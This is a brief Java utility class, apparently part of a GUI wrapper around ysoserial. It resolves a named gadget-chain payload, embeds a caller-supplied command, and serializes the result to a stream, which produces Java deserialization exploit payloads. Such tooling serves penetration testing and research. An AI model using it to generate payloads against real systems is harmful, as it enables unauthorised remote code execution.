package org.zof.deswing.util;

import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;

import java.io.OutputStream;

public abstract class Export {
    public abstract void export(String type,String command) throws Exception;
    public void exportToStream(String payloadType, String command, OutputStream out) throws Exception {
        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
        final ObjectPayload payload = payloadClass.newInstance();
        final Object object = payload.getObject(command);
        Serializer.serialize(object, out);
    }
}
